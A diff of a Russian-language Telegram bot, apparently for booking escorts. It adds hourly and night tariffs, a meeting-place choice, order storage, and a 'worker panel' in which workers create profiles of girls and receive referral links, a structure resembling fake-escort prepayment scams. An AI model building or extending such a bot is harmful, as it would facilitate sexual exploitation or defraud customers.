+        reply_markup=tariff_keyboard(user_id, price_1h, price_3h, price_night, profile_code)
+    )
+    await state.set_state(OrderStates.waiting_for_tariff)
+    await call.answer()
+
+@dp.callback_query(lambda c: c.data.startswith("tariff_"))
+async def order_tariff(call: types.CallbackQuery, state: FSMContext):
+    user_id = call.from_user.id
+    tariff = call.data.split("_")[1]
+    profile_code = call.data.split("_")[2]
+    
+    tariff_names = {
+        '1h': '1 час',
+        '3h': '3 часа',
+        'night': 'Ночь'
+    }
+    
+    profile_data = PROFILES.get(profile_code, {})
+    prices = {
+        '1h': profile_data.get('price_1h', 0),
+        '3h': profile_data.get('price_3h', 0),
+        'night': profile_data.get('price_night', 0)
+    }
+    
+    tariff_text = tariff_names.get(tariff, tariff)
+    amount = prices.get(tariff, 0)
+    
+    await state.update_data(tariff=tariff_text, amount=amount)
+    await call.message.delete()
+    await call.message.answer(
+        get_text(user_id, 'order_select_date'),
+        reply_markup=order_cancel_keyboard(user_id)
+    )
     await state.set_state(OrderStates.waiting_for_date)
     await call.answer()
 
@@ -705,7 +987,10 @@ async def order_date(message: types.Message, state: FSMContext):
         await message.answer(get_text(user_id, 'order_invalid_date'), reply_markup=order_cancel_keyboard(user_id))
         return
     await state.update_data(date=date)
-    await message.answer(get_text(user_id, 'order_select_time'), reply_markup=order_cancel_keyboard(user_id))
+    await message.answer(
+        get_text(user_id, 'order_select_time'),
+        reply_markup=order_cancel_keyboard(user_id)
+    )
     await state.set_state(OrderStates.waiting_for_time)
 
 @dp.message(OrderStates.waiting_for_time)
@@ -716,6 +1001,16 @@ async def order_time(message: types.Message, state: FSMContext):
         await message.answer(get_text(user_id, 'order_invalid_time'), reply_markup=order_cancel_keyboard(user_id))
         return
     await state.update_data(time=time)
+    await message.answer(
+        get_text(user_id, 'order_select_place'),
+        reply_markup=order_place_keyboard(user_id)
+    )
+    await state.set_state(OrderStates.waiting_for_place)
+
+@dp.callback_query(lambda c: c.data == "order_place_me")
+async def order_place_me(call: types.CallbackQuery, state: FSMContext):
+    user_id = call.from_user.id
+    await state.update_data(place="У меня")
     data = await state.get_data()
     
     profile_code = data.get('profile_code')
@@ -723,6 +1018,8 @@ async def order_time(message: types.Message, state: FSMContext):
     girl_name = profile_data.get('name', 'Не указано')
     date = data.get('date')
     time = data.get('time')
+    place = data.get('place')
+    tariff = data.get('tariff', 'Не выбран')
     
     confirm_text = f"""
 {get_text(user_id, 'order_confirm_title')}
@@ -730,11 +1027,45 @@ async def order_time(message: types.Message, state: FSMContext):
 {get_text(user_id, 'profile_name')} {girl_name}
 📅 Дата: {date}
 ⏰ Время: {time}
+📍 Место: {place}
+💰 Тариф: {tariff}
 
 ✅ Всё верно? Нажмите "Подтвердить"
     """
-    await message.answer(confirm_text, reply_markup=order_confirm_keyboard(user_id))
+    await call.message.delete()
+    await call.message.answer(confirm_text, reply_markup=order_confirm_keyboard(user_id))
     await state.set_state(OrderStates.waiting_for_confirm)
+    await call.answer()
+
+@dp.callback_query(lambda c: c.data == "order_place_model")
+async def order_place_model(call: types.CallbackQuery, state: FSMContext):
+    user_id = call.from_user.id
+    await state.update_data(place="У модели")
+    data = await state.get_data()
+    
+    profile_code = data.get('profile_code')
+    profile_data = PROFILES.get(profile_code, {})
+    girl_name = profile_data.get('name', 'Не указано')
+    date = data.get('date')
+    time = data.get('time')
+    place = data.get('place')
+    tariff = data.get('tariff', 'Не выбран')
+    
+    confirm_text = f"""
+{get_text(user_id, 'order_confirm_title')}
+
+{get_text(user_id, 'profile_name')} {girl_name}
+📅 Дата: {date}
+⏰ Время: {time}
+📍 Место: {place}
+💰 Тариф: {tariff}
+
+✅ Всё верно? Нажмите "Подтвердить"
+    """
+    await call.message.delete()
+    await call.message.answer(confirm_text, reply_markup=order_confirm_keyboard(user_id))
+    await state.set_state(OrderStates.waiting_for_confirm)
+    await call.answer()
 
 @dp.callback_query(lambda c: c.data == "order_confirm")
 async def order_confirm(call: types.CallbackQuery, state: FSMContext):
@@ -746,6 +1077,33 @@ async def order_confirm(call: types.CallbackQuery, state: FSMContext):
     girl_name = profile_data.get('name', 'Не указано')
     date = data.get('date')
     time = data.get('time')
+    place = data.get('place')
+    tariff = data.get('tariff', 'Не выбран')
+    amount = data.get('amount', 0)
+    
+    order_id = generate_order_id()
+    
+    order_data = {
+        'id': order_id,
+        'girl_name': girl_name,
+        'date': date,
+        'time': time,
+        'place': place,
+        'tariff': tariff,
+        'amount': amount,
+        'profile_code': profile_code,
+        'created_at': datetime.now().isoformat()
+    }
+    
+    if user_id not in USER_ORDERS:
+        USER_ORDERS[user_id] = []
+    USER_ORDERS[user_id].append(order_data)
+    
+    if user_id not in USER_ORDERS_COUNT:
+        USER_ORDERS_COUNT[user_id] = 0
+    USER_ORDERS_COUNT[user_id] += 1
+    
+    ORDERS[order_id] = order_data
     
     support_text = f"""
 {get_text(user_id, 'order_support_message').format(
@@ -754,6 +1112,8 @@ async def order_confirm(call: types.CallbackQuery, state: FSMContext):
     girl_name=girl_name,
     date=date,
     time=time,
+    place=place,
+    tariff=tariff,
     profile_code=profile_code
 )}
     """
@@ -763,16 +1123,6 @@ async def order_confirm(call: types.CallbackQuery, state: FSMContext):
             await bot.send_message(support_id, support_text)
         except:
             pass
-    
-    order_id = generate_order_id()
-    ORDERS[order_id] = {
-        'user_id': user_id,
-        'profile_code': profile_code,
-        'girl_name': girl_name,
-        'date': date,
-        'time': time,
-        'created_at': datetime.now().isoformat()
-    }
     
     await call.message.delete()
     await call.message.answer(
@@ -788,21 +1138,31 @@ async def order_cancel(call: types.CallbackQuery, state: FSMContext):
     user_id = call.from_user.id
     await state.clear()
     await call.message.delete()
-    await call.message.answer(get_text(user_id, 'order_canceled'), reply_markup=back_to_main_menu(user_id))
+    await call.message.answer(
+        get_text(user_id, 'order_canceled'),
+        reply_markup=back_to_main_menu(user_id)
+    )
     await call.answer()
 
+# ===== НАСТРОЙКИ =====
 @dp.callback_query(lambda c: c.data == "user_settings")
 async def user_settings(call: types.CallbackQuery):
     user_id = call.from_user.id
     await call.message.delete()
-    await call.message.answer(get_text(user_id, 'settings_title'), reply_markup=user_settings_menu(user_id))
+    await call.message.answer(
+        get_text(user_id, 'settings_title'),
+        reply_markup=user_settings_menu(user_id)
+    )
     await call.answer()
 
 @dp.callback_query(lambda c: c.data == "change_language")
 async def change_language(call: types.CallbackQuery):
     user_id = call.from_user.id
     await call.message.delete()
-    await call.message.answer(get_text(user_id, 'choose_language'), reply_markup=language_menu(user_id))
+    await call.message.answer(
+        get_text(user_id, 'choose_language'),
+        reply_markup=language_menu(user_id)
+    )
     await call.answer()
 
 @dp.callback_query(lambda c: c.data.startswith("lang_") and not c.data.startswith("lang_start_"))
@@ -815,6 +1175,7 @@ async def set_language(call: types.CallbackQuery):
     await call.message.answer(text, reply_markup=user_settings_menu(user_id))
     await call.answer()
 
+# ===== ВОРКЕР =====
 @dp.callback_query(lambda c: c.data == "worker_panel")
 async def worker_panel(call: types.CallbackQuery):
     user_id = call.from_user.id
@@ -851,12 +1212,7 @@ https://t.me/Aura_Agency_bot?start={user_id}"""
 async def back_to_main(call: types.CallbackQuery):
     user_id = call.from_user.id
     await call.message.delete()
-    photo = get_photo('main')
-    text = get_text(user_id, 'main_menu')
-    if photo:
-        await call.message.answer_photo(photo=photo, caption=text, reply_markup=main_menu(user_id))
-    else:
-        await call.message.answer(text, reply_markup=main_menu(user_id))
+    await send_main_menu(call, user_id)
     await call.answer()
 
 # ===== НАСТРОЙКИ ФОТО В ПАНЕЛИ ВОРКЕРА =====
@@ -1144,6 +1500,24 @@ async def profile_price_1h(message: types.Message, state: FSMContext):
     except ValueError:
         await message.answer(get_text(user_id, 'settings_invalid_number'))
         return
+    await message.answer(get_text(user_id, 'profile_price_3h_step'))
+    await state.set_state(CreateProfileStates.waiting_for_price_3h)
+
+@dp.message(CreateProfileStates.waiting_for_price_3h)
+async def profile_price_3h(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    if not is_worker(user_id):
+        await message.answer(get_text(user_id, 'settings_access_denied'))
+        return
+    try:
+        price = int(message.text)
+        if price < 2000 or price > 200000:
+            await message.answer(get_text(user_id, 'settings_invalid_price_3h'))
+            return
+        await state.update_data(price_3h=price)
+    except ValueError:
+        await message.answer(get_text(user_id, 'settings_invalid_number'))
+        return
     await message.answer(get_text(user_id, 'profile_price_night_step'))
     await state.set_state(CreateProfileStates.waiting_for_price_night)
 
@@ -1180,6 +1554,7 @@ async def profile_price_night(message: types.Message, state: FSMContext):
 
 {get_text(user_id, 'profile_prices')}
 {get_text(user_id, 'profile_1h')} {data['price_1h']} грн
+{get_text(user_id, 'profile_3h')} {data['price_3h']} грн
 {get_text(user_id, 'profile_night')} {data['price_night']} грн
 
 {get_text(user_id, 'profile_photos')} {len(data['photos'])} шт.
@@ -1211,6 +1586,7 @@ async def profile_confirm_save(call: types.CallbackQuery, state: FSMContext):
 
 {get_text(user_id, 'profile_prices')}
 {get_text(user_id, 'profile_1h')} {data['price_1h']} грн
+{get_text(user_id, 'profile_3h')} {data['price_3h']} грн
 {get_text(user_id, 'profile_night')} {data['price_night']} грн
 
 {get_text(user_id, 'profile_code')} {profile_id}
@@ -1295,6 +1671,7 @@ async def profile_find_by_code(message: types.Message, state: FSMContext):
 
 {get_text(user_id, 'profile_prices')}
 {get_text(user_id, 'profile_1h')} {data.get('price_1h', '?')} грн
+{get_text(user_id, 'profile_3h')} {data.get('price_3h', '?')} грн
 {get_text(user_id, 'profile_night')} {data.get('price_night', '?')} грн
 
 {get_text(user_id, 'profile_created_at')} {data.get('created_at', 'Неизвестно')}
@@ -1354,7 +1731,6 @@ async def worker_notifications(call: types.CallbackQuery):
     await call.message.answer(get_text(user_id, 'notifications'), reply_markup=back_to_worker_panel_inline(user_id))
     await call.answer()
 
-# ===== НАСТРОЙКИ ВОРКЕРА =====
 @dp.callback_query(lambda c: c.data == "worker_settings")
 async def worker_settings(call: types.CallbackQuery):
     user_id = call.from_user.id
@@ -1436,8 +1812,8 @@ async def submit(call: types.CallbackQuery):
 
 # ===== ОБРАБОТКА ОШИБОК =====
 @dp.errors()
-async def errors_handler(update: types.Update, exception: Exception):
-    logging.error(f"Ошибка: {exception}")
+async def errors_handler(event: types.ErrorEvent):
+    logging.error(f"Ошибка: {event.exception}")
     return True
 
 # ===== ЗАПУСК =====
